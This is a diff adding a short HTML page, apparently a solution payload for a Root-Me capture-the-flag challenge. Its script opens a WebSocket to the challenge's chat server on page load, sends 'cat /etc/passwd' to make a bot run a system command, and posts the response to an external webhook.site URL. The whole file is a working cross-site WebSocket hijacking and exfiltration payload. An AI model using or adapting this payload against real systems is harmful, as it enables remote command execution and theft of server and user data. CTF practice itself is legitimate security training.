@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test</title>
+</head>
+
+<body>
+    <script>
+        // Crée une connexion WebSocket vers le serveur de chat (qui est vulnérable)
+        const ws = new WebSocket("ws://ctf15.root-me.org/ws");
+
+        ws.onopen = () => {
+            // Quand la connexion WebSocket est ouverte, envoie un message malicieux
+            // Envoie un message qui va exploiter le bot et exécuter une commande système
+            ws.send('cat /etc/passwd');
+        };
+
+        ws.onmessage = function (event) {
+            // Quand une réponse est reçue via WebSocket, envoie la donnée au webhook
+            const payload = {
+                data: event.data // Cette donnée peut être la sortie de la commande
+            };
+
+            // Envoie la donnée vers le webhook via une requête POST
+            fetch('https://webhook.site/8d7dd689-1851-4e25-98de-6d05cca580c1', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload) // Sérialise la donnée en JSON
+            }).then(response => {
+                console.log("Donnée envoyée au webhook avec succès", response);
+            }).catch(error => {
+                console.error("Erreur lors de l'envoi au webhook", error);
+            });
+        };
+    </script>
+</body>
+
+</html>
